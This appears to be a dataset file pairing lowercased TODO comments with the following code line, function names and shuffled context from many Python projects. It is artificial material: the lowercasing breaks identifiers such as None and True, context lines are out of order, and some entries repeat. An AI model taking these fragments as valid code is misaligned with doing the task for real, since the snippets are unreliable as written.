# todo: use is_accessible once two layer trie is implemented </s> if keccak(address) + code_trie_prefix not in self.read_list:	delete_account 'Attempted deleting account without full storage access' ) raise UnannouncedStateAccess( "Attempted deleting code of account outside of write list"
return 1  # todo +self.rec(expr.index)? </s> return 0  # todo is this right? recurse on index?	map_subscript if not isinstance(array, lp.GlobalArg):
# todo: support speedy mode for running the script </s> shell("make scriptconfig script=kconfiglib/examples/allnoconfig.py")	test_all_no 'make scriptconfig' and needs to reparse the configurations, so kinda slow even in speedy mode.""" shell("mv .config ._config") if speedy_mode:
#todo: namespaces too hardwired, clean-up... </s> header(k)['xmlns:wsse'] = 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'	preprocess self.token = headers[k] header.marshall(k, self.token, ns=False, add_children_ns=False)
#@todo: remove in 0.4.10 </s> def _log(self, level, plugintype, pluginname, messages):	_log plugintype = "addon" if plugintype is "hook" else plugintype return super(Addon, self)._log(level, plugintype, pluginname, messages)
# todo: in 0.6.0 change this to "disabled": false </s> "enabled": true,	test_server_mode "duplicate_cn": True, "engine": "rsax", "fast_io": True, "fragment": 0,
# todo: still doesn't handle the case where the user wants </s> blank = r'[^0-9a-za-z]'	name_to_re def name_to_re(name): res = re.sub(blank+'+', ' ', name) res = res.strip()
# todo: check implementation </s> a = safe_divide(cov_xy, w_cov_xy[none, :])	compute_pattern w_cov_xy = np.diag(np.dot(W2D.T, cov_xy))
raise notimplemented  # todo: other backends </s> felix = felix_config.produce(domains=network, known_nodes=teacher_nodes)	felix click.secho(f"Added ethereum peer {enode}") else: FELIX.make_web_app()  # attach web application, but dont start service except Exception as e:
# todo: save message to history </s> if self.is_active_online() and text:	send_message Send message to active friend :param text: message text if text.startswith('/me '): message_type = TOX_MESSAGE_TYPE['ACTION']
# todo: maybe inefficient. use matrix operation </s> score_mat = np.empty((_batchsize, self.n_entity))	cal_scores_inv rel_emb = self.pick_rel(rels) qs_inv = rel_emb - obj_emb for i in range(_batchsize): score_mat[i] = - np.linalg.norm(self.pick_ent(np.arange(self.n_entity)) + qs_inv[i], axis=1) ** 2
# todo: remove str() when dropping support for py37. </s> return [str(exe_entrypoint), *sys.argv[1:]]	get_child_arguments exe_entrypoint = py_script.with_suffix('.exe') if exe_entrypoint.exists(): script_entrypoint = py_script.with_name('%s-script.py' % py_script.name) if script_entrypoint.exists():
# todo: figure out why yask doesn't like it with dse/dle </s> operator(eqs, name='padfunc', dse='noop', dle='noop')()	initialize_function thickness=nbpml) eqs += [Eq(function.subs({d: dim_r}), function.subs({d: s-nbpml-1}))]
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_filtered_multiple_sources pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# todo: remove compatability hooks </s> if not exists(lockfile):	lock_version_dir if sys.platform == "win32": lockfile = pathjoin(vdir,ESKY_CONTROL_DIR,"bootstrap-manifest.txt") lockfile = pathjoin(vdir,"esky-bootstrap.txt") _locked_version_dirs.setdefault(vdir,[]).append(open(lockfile,"rt"))
except exception:  # todo what exception? </s> raise validationerror('cannot load module')	validate_python_functions test_module = importlib.util.module_from_spec(spec) spec.loader.exec_module(test_module) if hasattr(test_module, 'render'): if callable(test_module.render):
# todo: remove warning check once deprecated </s> hits = list(self.df.sindex.intersection((2.5, 2.5, 4, 4), objects=true))	test_sindex assert self.df.sindex.size == 5 with pytest.warns(FutureWarning, match="`objects` is deprecated"): assert len(hits) == 2 assert hits[0].object == 3
# todo: sinpi </s> return pi / (math.sin(pi*x)*_gamma_real(1-x))	_gamma_real return _exact_gamma[_intx] if x < 0.5: else: x -= 1.0
# todo: simplest possible unicast learning. </s> host_learned_other_dp = none	rcv_packet learn_port = port else:
# todo: handle marker? </s> else:	_find_alias aliases = conn.list_aliases(FunctionName=functionname, FunctionVersion=functionversion) aliases = conn.list_aliases(FunctionName=functionname) for alias in aliases.get('Aliases'):
# todo: here the index is correlated to the duals, try if this can be fixed when temp duals are removed. </s> if constr.body.polynomial_degree() in (0, 1):	add_lazy_oa_cuts for (constr, dual_value) in zip(target_model.MindtPy_utils.constraint_list, dual_values): continue constr_vars = list(identify_variables(constr.body))
pass # todo </s> s.write('  msg\n)\n')	write_deserialize write_deserialize_builtin(s, field) else:
# todo extend to nonbinary nodes </s> non_input_indices = set(tpm_indices(tpm)) - set(self._input_indices)	__init__ tpm_on = tpm[..., self.index] tpm_on = utils.marginalize_out(non_input_indices, tpm_on) tpm_off = 1 - tpm_on
# todo (b/151636380): remove when cl/299961405 is propagated through kokoro. </s> if metric_name == 'specificity_at_sensitivity':	testMetricsWithoutWeights ) def testMetricsWithoutWeights(self, metric_name, expected_value): fix_present = hasattr(tf.keras.metrics.SpecificityAtSensitivity, '_find_max_under_constraint')
# todo: investigate why results are sometimes 'nan' </s> return	draw_eyeball_outline ) except ValueError: draw_polyline( pts, 2, RGBA(0.0, 0.9, 0.1, pupil_detection_result_3d["model_confidence"])
# todo(yamahata): eliminate dumb polling </s> while true:	_setup_block_device_mapping vol = self.volume_api.create(context, bdm['volume_size'], '', '', snapshot) volume = self.volume_api.get(context, vol['id']) if volume['status'] != 'creating':
# migration todo: remove ? </s> channel = self.connection.channel()	__init__ self.backend_url = config_d['backend_url'] self.connection = Connection(self.backend_url) bound_process_events_queue = process_events_queue.bind(channel) bound_process_events_queue.unbind_from(events_exchange)
#todo use backup phone </s> generated_token = totp(token.seed)	verify_computer token = user.token if token.method in ('call', 'sms'): if token.method == 'call': call(to=token.phone, request=request, token=generated_token)
pass  # todo </s> def _ondeviceconnectionstatechanged(self, key):	_onDeviceConnectionStateChanged
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo: use flask logger without it triggering the root </s> __name__: {	init_logging }, "loggers": { "handlers": [], "level": os.getenv("ORCHEST_LOG_LEVEL", "INFO"),
#ack = self.serialport.read() # todo: use ack </s> def enable(self):	Device def disable(self): self.sendCommand(129) # 10000001 self.sendCommand(141) # 10001101 def disable(self):
# todo: need to figure out how we prevent multiple selfdestructs from </s> if vm.logger is not none:	_execute_frontier_transaction with vm.state_db() as state_db: for account, beneficiary in computation.get_accounts_for_deletion(): vm.logger.debug('DELETING ACCOUNT: %s', encode_hex(account)) state_db.set_balance(account, 0)
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_GET_InvalidURL try: self.assertEqual(self.rnw.GET(url, data), 'json') self.assertEquals(e, TypeError)
# todo make this a private api </s> name_elements = ['name', 'housenumber', 'street',	parse_resource @classmethod def parse_resource(cls, resource): 'postcode', 'street', 'city', 'state', 'country']
# todo: dateparser is a little greedy, consuming the "on " as well as the date </s> self.compare_before_after()	test_DoB_5 BEFORE: my name is Jane and I was born on 11/22/1972 AFTER:  my name is Jane and I was born {{DATE_OF_BIRTH}}
+ ansi.ansi_normal  # todo: why does it keep it? </s> + "foo"))	test_re_underline parser.re_underline( "a " + ansi.ANSI_UNDERLINE + "red"
# todo: is there a more elegant fix? </s> self._output = ""	_capture_output self._output = self._file_in.read() except IOError as error: else: output_buffer = []
# todo: improve handling of s.a < s.b and s.a > s.b cases. </s> a = find_bracket_location(s.begin())	move_to_bracket return sublime.Region(s.a, a) if mode == MODE_VISUAL_LINE: if a is not None: a = self.view.full_line(a).b
# todo: test & review this part </s> sudo_command = "sudo -i -u {}".format(vbox_user) + " ".join(command)	execute vbox_user = self.config.get_section_config("VirtualBox").get("vbox_user") if vbox_user: process = yield from asyncio.create_subprocess_shell(sudo_command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE) else:
# todo: type: literal["m", "h", "x", "b"] </s> raise notimplementederror	setDefiFormat def setDefiFormat(self, defiFormat: str) -> None:
# todo make this a real request </s> try:	create if form.is_valid(): user = form.clean() api.account_api(request).users.create(user['id'], user['email'],
# todo: fails because of missing svg support </s> for url in [	test_images_4 @assert_no_logs def test_images_4(): 'data:image/jpeg;base64,' 'R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs=',
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_approvees_wrong_type def test_fail_approvees_wrong_type(self):
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo: arrange </s> repo = self.remote.new_repo(self.token)	test_create_repo def test_create_repo(self): Test: create/edit a repo object self.assertTrue(self.remote.modify_repo(repo, "name", "testrepo0", self.token)) self.assertTrue(self.remote.modify_repo(repo, "mirror", "http://www.sample.com/path/to/some/repo", self.token))
# todo convert to fit transform </s> def over_sampling(self, random_state=0):	over_sampling
# todo (elliot): put this in the preferences. </s> if prefs.get("stripdevelopersuffixes", false) is true:	recipe_dirpath path_components = [prefs["RecipeCreateLocation"]] if dev is not None and prefs.get("FollowOfficialJSSRecipesFormat", False) is False: dev = strip_dev_suffix(dev) for char in char_replacements:
# todo: 搜索和分页 </s> keyword = request.get.get('search', '')	perm_rule_add header_title, path1, path2 = "授权规则", "规则管理", "查看规则" rules_list = PermRule.objects.all() if keyword: rules_list = rules_list.filter(Q(name=keyword))
#todo: append the rule instead of overwrite the full content </s> self.root.file( '.gitignore' ).write( file_to_ignore_regexp )	ignore def ignore(self, file_to_ignore_regexp): Build a .gitignore file including the file_to_ignore_content
# todo check </s> return self.mimetype.split('/')[-1]	encoding @interfacedoc def encoding(self):
# todo: figure out a better way to do things </s> gens_prod = cartesian_product([family(g.group_generators(),	group_generators ret = [lift(i, gen) for i,G in enumerate(F) for gen in G.group_generators()] return Family(ret) lambda g: (i, g)) for i,G in enumerate(F)])
# todo: requires explicit broadcast in future </s> if len(val.axes - tensor.axes) > 0:	AssignOp if len(val.axes) == len(tensor.axes): val = cast_axes(val, tensor.axes) raise ValueError( "tensor(LHS) has axes %s, val(RHS) has axes %s,"
# todo: check whether loaded network has the same number of classes as specified in ilastik! </s> self._loaded_pytorch_net = tiktorch.unserialize(self._filename)	create_and_train_pixelwise def create_and_train_pixelwise(self, feature_images, label_images, axistags=None, feature_names=None): logger.debug('Loading pytorch network from {}'.format(self._filename)) return PyTorchLazyflowClassifier(self._loaded_pytorch_net, self._filename)
# todo add list as an option </s> if ia.is_single_number(p):	Dropout def __init__(self, p=0, per_channel=False, name=None, deterministic=False, random_state=None): p2 = iap.Binomial(1 - p) elif ia.is_iterable(p):
# todo: make the get_closest_value to return region </s> number, number_index = self.get_closest_value(	get_current_numeric_value self.current_value['context'] = 'DateMonth' else: word_like, word_like_index,
pass # todo: implement </s> print "action requested", name	actionForName def actionForName(self, name):
# todo jython </s> return none	selected_npn_protocol def selected_npn_protocol(self): self._checkClosed()
# todo: remove in v2.8 </s> if self.template_language == exporttemplatelanguagechoices.language_django:	embed_url def embed_url(self, obj): context = {'obj': obj} template = Template(self.source) return template.render(Context(context))
# todo(lyarwood): test drivervolumeblockdevice.driver_detach in </s> expected_connector = {'host': 'evacuated-host'}	test_detach_volume_evacuate def test_detach_volume_evacuate(self): conn_info_str = '{"connector": {"host": "evacuated-host"}}' self._test_detach_volume_evacuate(conn_info_str,
# todo consider more type conversions? </s> if value.isdigit():	capture_tileset name = p.attrib['name'] value = p.attrib['value'] value = int(value) tile.properties[name] = value
# todo: python-components: for now, we call each preprocessor's graph_fn directly. </s> if self.backend == "python" or get_backend() == "python":	reset def reset(self): for preprocessor in self.sub_components.values():  # type: PreprocessLayer preprocessor._graph_fn_reset()
# todo: test this method </s> value = self.cleaned_data['extra']	clean_extra def clean_extra(self): if strip_tags(value).strip(): raise forms.ValidationError("Extra code may not contain text outside tags (advanced use only).")
#reactor.stop() # for unknown reasons, reactor.stop() isn't working.  [ ] todo </s> self.log('calling os.abort()')	_service_startup_failed print "Node._startService failed, aborting" print failure log.msg('calling os.abort()') print "calling os.abort()"
# see optimization description comments and todo for tags in matching public histories query. </s> return trans.sa_session.query(self.model_class).join("user").options(eagerload("user").load_only("username"), eagerload("annotations"), undefer("average_rating"))	build_initial_query def build_initial_query(self, trans, **kwargs):
# todo: remove </s> if(gnome_power_stats != 0):	gnome_power_enable def gnome_power_enable(): print("\nEnabling GNOME power profiles") call(["systemctl", "unmask", "power-profiles-daemon"])
# todo: "dob.role is not none" </s> if dob.role is not none and dob.role != 'isw_raid_member' \	_update_disk_state if d.fstype == 'isw_raid_member' or d.fstype == 'linux_raid_member': and dob.role != 'linux_raid_member': known_roles = json.loads(dob.role)
#todo - once we drop support for python 2.4, instead of this </s> suffix_strings = [self._get_seq_str_and_check_alphabet(p) \	endswith True if isinstance(suffix, tuple) : for p in suffix] for suffix_str in suffix_strings :
# todo(rameshg87): need better way of asserting the routes. </s> self.assertisinstance(driver.vendor, utils.mixinvendorinterface)	test_pxe_ipmitool_driver self.assertIsInstance(driver.management, ipmitool.IPMIManagement) self.assertIsNone(driver.inspect) self.assertIsInstance(driver.raid, agent.AgentRAID)
# todo: should this do the same cleanup as the on_message code? </s> client.request.remote_ip, e)	broadcast logger.debug('Broadcast of WebSocket message to %s failed: %s',
try:  # todo: fix brodcast issue if different </s> if np.ndim(y) < 2:	feed_dict_builder Y = [Y for _t in net_targets] elif len(net_targets) > 1: raise ValueError("Multiple outputs but only one data " "feeded. Please verify number of outputs "
# todo: automate this (by lookup from nn). </s> internal_states_space=impalaagent.standard_internal_states_space,	test_impala_actor_plus_learner_agent_functionality_actor_part state_space=env.state_space, action_space=env.action_space, execution_spec=dict( mode="distributed",
# todo: log in with right permissions and request the page again </s> self.assertredirects(response, 'http://testserver/accounts/login/?next=/test_client/permission_protected_method_view/')	test_view_with_method_permissions response = self.client.get('/test_client/permission_protected_method_view/')
raise notimplementederror #todo </s> elif self.action == "split":	Action raise NotImplementedError #TODO elif self.action == "MERGE": raise NotImplementedError #TODO elif self.action == "SELECT":
# todo get tri-letter dimensionality from fit-transform as input shape </s> params.add(engine.param('input_shapes'))	get_default_params params.add(engine.Param('w_initializer', 'glorot_normal')) params.add(engine.Param('b_initializer', 'zeros')) params.add(engine.Param('dim_fan_out', 128)) params.add(engine.Param('dim_hidden', 300))
# todo: remove when unicode vlens implemented </s> if isinstance(tid, h5t.typestringid) and tid.get_cset() == h5t.cset_utf8 and attr.shape == ():	__getitem__ attr = h5a.open(self._id, self._e(name)) tid = attr.get_type() unicode_hack = True else:
raise notimplementederror  # todo... </s> elif self.wrap_mode != "wrap_around":	perform beam = beam_trans.transpose(*map(array_trans_dims_order.index, range(array.ndim))) if self.wrap_mode == "pad_zero": raise NotImplementedError beam_out[0] = beam
# todo: refactor accordingly when v3 websocket api is released </s> trading_pair = f"{trading_pair.split('-')[1]}-{trading_pair.split('-')[0]}"	BittrexAPIOrderBookDataSource trading_pairs = await self.get_trading_pairs()  # Symbols of trading pair in V3 format i.e. 'Base-Quote' for trading_pair in trading_pairs: self.logger().info(f"Subscribed to {trading_pair} Deltas") hub.server.invoke("SubscribeToExchangeDeltas", trading_pair)
""" todo: documentation </s> configurationsettings = type(self).configurationsettings	_prepare def _prepare(self, argv, input_file): argv = argv[2:] if input_file is None:
# todo: support for 'file' type </s> else:	validate_schema_object elif obj_type == 'object': validate_object(schema_object_spec, value) raise SwaggerMappingError('Unknown type {0} for value {1}'.format( obj_type, value))
# todo get the default name from preferences </s> return os.path.join(self.get_scratchpad_prefix(), "scratchpad_default.ora")	get_scratchpad_default def get_scratchpad_default(self):
# todo results from p0f </s> return	_get_ipv6_os @staticmethod def _get_ipv6_os(endpoint):
# todo print out the certificates </s> finalize_connection(server)	try_ssl_handshake cipher=cipher[0]) W.prnt(server.server_buffer, cipher_message) return True except ssl.SSLWantReadError:
# todo: cleanly remove clipboard code if it is no longer needed </s> return httpresponsebadrequest('not implemented anymore')	paste_clipboard_to_folder def paste_clipboard_to_folder(request): if True: if request.method == 'POST': folder = Folder.objects.get(id=request.POST.get('folder_id'))
# todo: start here </s> return k.e_tag.strip('"')	md5sum k = self.get_s3_key(path)
# todo trace model </s> predictions = self.model(inputs)[0]	FeatureExtractionPipeline ) if is_tf_available(): else: import torch
# todo: deprecated function. see ticket #453. </s> if not self._capabilities:	_getcapproperty def _getcapproperty(self): reader = TMSCapabilitiesReader( self.version, url=self.url, un=self.username, pw=self.password
#todo this will change when we attempt #35, since this assumes intersection </s> query_script = """	execute index_qs.append((index_name, str(q))) if built_q: neo4j = g.getRawGraph() indexManager = neo4j.index()
# todo - make this work on loop with more than two links </s> flt_parallel = lambda loop: round(loop.calc_angle(),3) == 3.142	from_edges loops = list(set(loops)) if remove_colinear: flt_mid = lambda loop: loop.link_loop_next in loops and loop.link_loop_prev in loops cls.colinear_loops.extend([l for l in loops if (flt_parallel(l) and flt_mid(l))])
# todo test </s> def _state_reachable_from(past_state, current_state, tpm):	_state_reachable_from test = tpm[past_state] - state return np.all(np.logical_and(-1 < test, test < 1))
# reasons why we said no. todo: allow configurable error messages </s> raise synapseerror(	edit_published_room_list user_id, room_id, room_aliases, ): 403, "Not allowed to publish room", )
#todo: remove convert_bare true and deprecate this in with_ </s> loop_terms = listify_lookup_plugin_terms(terms=self._task.loop_args, templar=templar, loader=self._loader, fail_on_undefined=true, convert_bare=true)	_get_loop_items if self._task.loop: if self._task.loop in self._shared_loader_obj.lookup_loader: items = self._shared_loader_obj.lookup_loader.get(self._task.loop, loader=self._loader, templar=templar).run(terms=loop_terms, variables=vars_copy) else:
# todo check if we can avoid that </s> out = numpy.zeros(npyra)	read_buffer cells["pyramid"] = out - 1 cells["pyramid"] = cells["pyramid"][ : , [3,2,4,0,1] ] cell_data["pyramid"] = {"ugrid:ref": out} if nprism > 0 :
# todo: this should be abstracted into a property/method or something </s> if region.inherited and not contents and hasattr(obj, 'parent_id') and obj.parent_id:	collect_items def collect_items(obj): contents = obj._content_for_region(region) return collect_items(obj.parent) return contents
# todo: t102735: use the page content model for <1.21 </s> for rev in revisions:	_update_revisions def _update_revisions(page, revisions): revision = pywikibot.page.Revision( revid=rev['revid'],
# todo: log exception </s> return jsonify({'error': 'no maec report found for that task!'})	get_maec_report ) except Exception as e: response = make_response(jsonify(maec_report.json())) response.headers['Content-Type'] = 'application/json'
# todo: (find a way to) test if the line underneath indeed correctly replaces the reimplemented values method </s> preprocess_reply=lambda r: r.replace('\x00', ''),	__init__ "Signal Recovery DSP 7265", includeSCPI=False, **kwargs
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	_update_user if not activity.has_key('id'): assert False, "activity object has no id value" assert False, "activity has no revision_id value" timestamp = datetime_from_string(activity['timestamp'])
# todo: refactor this to be more uniform across sources </s> super().update_menu()	update_menu def update_menu(self): self.menu.append( ui.Info_Text(f"NDSI Source: {self._sensor_name} @ {self._host_name}")
# todo: beautify output </s> if os.path.isfile(config_file_path):	check def check(): with open(config_file_path, 'r') as config_file: contents = yaml.load(config_file)
# todo: implement me </s> return tracks	get_subtitle_tracks def get_subtitle_tracks(self): tracks = list()
# todo: make this section of code easier to understand. </s> new_context = {}	_deserialize_spec_test template = data['template'] test_name = data['name'] for key, val in context.iteritems(): if isinstance(val, dict) and val.get('__tag__') == 'code':
# todo add a conditional to toggle this </s> remove_tool_output_from_mets(tree)	index_mets_file_metadata 'f': 'http://hul.harvard.edu/ois/xml/ns/fits/fits_output', } dmdSec = root.findall("m:dmdSec/m:mdWrap/m:xmlData", namespaces=nsmap) dmdSecData = {}
# todo yoon </s> try:	train_lm chars = " ".join(truncated_sent) f.write(chars+'\n') rev_lm = train_rnnlm(kenlm_path=args.kenlm_path, data_path=save_path,
# todo: ^intel-parallel-studio can mean intel mpi, a compiler or a lib </s> else:	scalapack_libs elif self.spec.satisfies('^mpt'): libnames.append('libmkl_blacs_sgimpt') raise InstallError("No MPI found for scalapack") shared = True if '+shared' in self.spec else False
raise exceptions.mpdnotimplemented  # todo </s> .. versionadded:: mpd protocol 0.19	cleartagid remote songs.
# todo: could also blame / </s> e_die('divide by zero',	ArithEvaluator elif op_id == Id.Arith_Percent: if rhs == 0: span_id=location.SpanForArithExpr(node.right)) ret = lhs % rhs
# todo ... </s> return false	is_uptodate def is_uptodate(outfile, depfiles):
#    #todo </s> else:	handle_VENDOR if e is None or e.halt != True: con.raiseEventNoErrors(PacketIn, con, msg) DefaultOpenFlowHandlers.handle_VENDOR(con, msg)
# todo: (longer term) rather than abort, reject this candidate </s> dist = self._dist  # type: distribution	_check_metadata_consistency def _check_metadata_consistency(self): name = canonicalize_name(dist.project_name) if self._name is not None and self._name != name:
# todo check if this always works? </s> col = bpy.data.collections.get('collection')	draw_object_only_with_vertices mesh = bpy.data.meshes.new('mesh') obj = bpy.data.objects.new(name, mesh) col.objects.link(obj) bm = bmesh.new()
"""todo: not implemented""" </s> notimplementederror("prs welcome")	percent_rank @symbolic_dispatch def percent_rank(x):
# todo: delete </s> z_log_fugacity_coefficients = self.fugacity_coefficients(zz, zs)	_Stateva_Tsvetkov_TPDF_broken def _Stateva_Tsvetkov_TPDF_broken(self, Zz, Zy, zs, ys): y_log_fugacity_coefficients = self.fugacity_coefficients(Zy, ys) kis = []
#todo: use a getter </s> return self.dst.style['out']	get_output_style @return: the style for output docstring @rtype style: str
# todo(dcramer): we want to be less aggressive on disabling domains </s> cache.set(domain_key, error or '', 300)	fetch_url logger.exception(unicode(exc)) error = ERR_UNKNOWN_INTERNAL_ERROR logger.warning('Disabling sources to %s for %ss', domain, 300, exc_info=True)
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: we possibly need to sync so all replicas are upto date </s> get_apex_utils().sync_devices()	_train_epoch get_apex_utils().clip_grad(self._grad_clip, self.model, self._optim) self._optim.step() if self._sched and not self._sched_on_epoch: self._sched.step()
# todo: summary hash for new current id </s> output_data_container.append(current_id, output.data_inputs, output.expected_outputs)	handle_fit_transform context ) return self, output_data_container
# todo: how would this change with domain? </s> if start_time is none:	iterperiods def iterperiods(self, start_time=None, end_time=None): span) and yields (time, duration, value) tuples. start_time = self.d.iloc[0] if end_time is None:
# todo: copy other properties (gcps etc). several other </s> )[0]	clip boundless=True,
# todo: change these to reflect values set in the database </s> ph_sensor_uart = atlasscientificuart(	calibrate ph_sensor_i2c = None if interface == 'UART': serial_device='/dev/ttyAMA0', baudrate=38400) elif interface == 'I2C':
# todo: test. </s> return [status.newfromjsondict(x) for x in data]	GetListTimeline data = self._ParseAndCheckTwitter(resp.content.decode('utf-8'))
# todo: add corrections back in here, rather than at points of use </s> return iau2000a(self.tt)	_nutation_angles @reify def _nutation_angles(self):
# todo: should this function go to the cache class and </s> with open(path, "r+b") as file:	create_dummy def create_dummy(self, path): self.api.upload(file, path) os.remove(path)
# todo: catch and report error if possible </s> self._client._loop.create_task(self._client.send(	_onRequestIntercepted username = getattr(self, '_credentials', {}).get('username') password = getattr(self, '_credentials', {}).get('password') 'Network.continueInterceptedRequest', { 'interceptionId': event['interceptionId'],
# todo[jigish] is this required? </s> return response(data, 200, generate_headers(repository, 'read'), true)	get_library_images return api_error('images not found', 404)
# todo: refactor more better(tm) </s> self.input_space.validate(state_below)	_linear_part def _linear_part(self, state_below): if self.requires_reformat: if not isinstance(state_below, tuple):
sleep(5) # todo: replace this with zmq signalling </s> shutil.copyfile(available, enabled)	restart_app echo("Restarting app '%s'..." % app, fg='yellow') os.unlink(enabled) else: echo("Error: app '%s' not enabled!" % app, fg='red')
# todo: handle fancy-index copies by allocating a buffer and </s> return tuple(	_next def _next(self, next_index): fn(batch) if fn else batch for batch, fn in safe_zip(self._dataset.get(self._source, next_index),
# todo(dtroyer): remove tenant_id when we clean up the sdk refactor </s> 'tenant_id': self.project.id,	test_create_with_project_identityv2 'admin_state_up': True, 'name': self._network.name, 'project_id': self.project.id, })
# todo: other "expected" error types to catch? </s> except pywikibot.error, err:	_save if not callback: raise logger.exception(u"Error saving page %s\n" % link) pywikibot.output(u"")
# todo: handle data types </s> if direction == "forward":	handle_l_s_t_m lstm_cell_bw = [tf.contrib.rnn.LSTMCell(hidden_size, **cell_kwargs)] cell_bw = tf.contrib.rnn.MultiRNNCell([lstm_cell_bw]) output, state = tf.nn.dynamic_rnn(cell, input_dict[node.inputs[0]],
# todo: figure out how to grab the creds from environment variables in travis and then release </s> c.run('python3 -m twine upload dist/*')	upload_to_pypi_prod_server def upload_to_pypi_prod_server(c): c.run('python3 -m pip install --upgrade twine') c.run('python3 -m pip install policy_sentry')
pass # todo </s> def handle_request(self, input):	handle_request
# todo extend to nonbinary nodes </s> if i not in self._input_indices and i in self.context.node_indices:	__init__ else: self._dimension_labels.append(None) past_tpm_on = past_tpm_on.sum(i, keepdims=True) / 2 past_tpm_off = past_tpm_off.sum(i, keepdims=True) / 2
# todo: test that the connection gets closed if ping responses stop. </s> yield self.close(ws)	test_server_ping self.assertEqual(response, "got pong")
# todo: remove input `form` in sage 9.3 </s> import warnings	add_connection_form self._del_derived()  # deletes the derived quantities if form: warnings.warn("the input 'form' is outdated and will be removed " "in a future version of Sage", DeprecationWarning)
#todo now the content must be in cache! (got to handle transfer error) </s> path = os.path.expanduser(os.path.join('~', '.config',	_get_msn_object_path self.cbs = (self._download_avatar, self._download_avatar) self.msn_object_store.request(msn_object, self.cbs) 'emesene2', self.session.account.account, msn_object._checksum_sha + ".png"))
# todo: remove this </s> if not caught:	visit_try_stmt self.accept(handler) caught = True self.write_ind('catch (std::exception) { }')
# todo: implement </s> return 1	hook_GetStringTypeExA }) def hook_GetStringTypeExA(ql: Qiling, address: int, params):
except exception:  # todo - which exceptions? </s> pass  # skip unparsable tag	_parse_feature try: feature.qualifiers[feature_element.tag.replace(NS, '')] = feature_element.text self.ParsedSeqRecord.features.append(feature)
return 'ok' # todo should be a json or something </s> viewer.status = 'running'	play def play():
# todo: remove "get_" from the name </s> return the type of the node	get_node_type def get_node_type(self, node, index=False): Args: node: The node ID from the original graph
# todo 目前仅在 华泰子类 中实现 </s> start_date, end_date = helpers.get_30_date()	exchangebill 默认提供最近30天的交割单, 通常只能返回查询日期内最新的 90 天数据。 :return: return self.get_exchangebill(start_date, end_date)
# todo: how to get the api version without split & strip </s> api_version = shopifyresource._site.split('/')[-1].strip('-')	save if 'product_id' not in self._prefix_options: self._prefix_options['product_id'] = self.product_id start_api_version = '201910' if api_version >= start_api_version:
# @todo: pheonix </s> tree.setitemtext(childid, 1, "level %d" % int(level) if isinstance(level, float) else level)	populateSkillTreeSkillSearch level, dirty = sChar.getSkillLevel(char.ID, id)
# todo properly use locales </s> value = value or 0	brazilian_integer @register.filter() def brazilian_integer(value): value = f'{value:,.0f}' return value.replace(',', '.')
# todo(hartikainen): this should get the logdir some other way than </s> summary_dir = logger._snapshot_dir	__init__ self._init_critic_update() self._init_target_ops() self.summary_writer = tf.summary.FileWriter( summary_dir, self._sess.graph)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_optional_parameters_omitted def test_pass_optional_parameters_omitted(self): Request omits optional parameters.
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_DELETE_InvalidData try: self.assertEqual(self.rnw.DELETE(url, data), 'json') self.assertEquals(e, TypeError)
x.shape[0:], # todo test reshape, dimshuffle </s> x.shape[0:1])]:	test_equality_shapes Shape_i(0)(x), join(0, f = theano.function([x], T.eq(g, 0), mode=mode) assert f([3, 3]) == 0
# todo: figure out why this causes circular import </s> from corehq.apps.reports.commtrack.util import stockledgervaluewrapper	get_wrapped_ledger_values def get_wrapped_ledger_values(domain, case_ids, section_id, entry_ids=None): query = LedgerES().domain(domain).section(section_id).case(case_ids) if entry_ids:
# todo remove compatibility shims for anki 2.1.46 and lower. </s> get_conf = decks.get_config if hasattr(decks, 'get_config') else decks.getconf	from_collection def from_collection(cls, collection, deck_config_id): decks = collection.decks anki_dict = get_conf(deck_config_id) deck_config = DeckConfig(anki_dict)
# todo(okuta): check type </s> return a.nanprod(axis, dtype, out, keepdims)	nanprod return fusion._call_reduction(_math.nanprod_auto_dtype, a, axis=axis, dtype=dtype, out=out)
# todo remove arch dependent code </s> target_oprnd = asm_instruction.operands[0]	extract_call_target def extract_call_target(asm_instruction): address = None if isinstance(target_oprnd, X86ImmediateOperand) or \ isinstance(target_oprnd, ArmImmediateOperand):
# todo(jd) add an exception in oslo.db to match foreign key </s> if isinstance(e.inner_exception,	create_resource session.flush() except exception.DBError as e: sqlalchemy.exc.IntegrityError): raise indexer.NoSuchEntity(None)
# todo: sysex messages do not arrive here. </s> def pending(self):	pending if self._parser.pending(): return self._parser.get_message()
# todo(b/155804245) sanitize the names so that they're valid python names </s> input_channel_parameters[input_name] = (	create_container_component execution_parameters = {} for input_name, channel_type in inputs.items(): component_spec.ChannelParameter( type=channel_type,
# todo: reevaluate how to deal with different types of errors; soft </s> del result['error']	smart_search_vrf search_options, extra_query ) except NipapError, e: return json.dumps({'error': 1, 'message': e.args, 'type': type(e).__name__})
#todo: validate keys </s> data = self.rh_obj.get_account()	test_get_account def test_get_account(self):
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
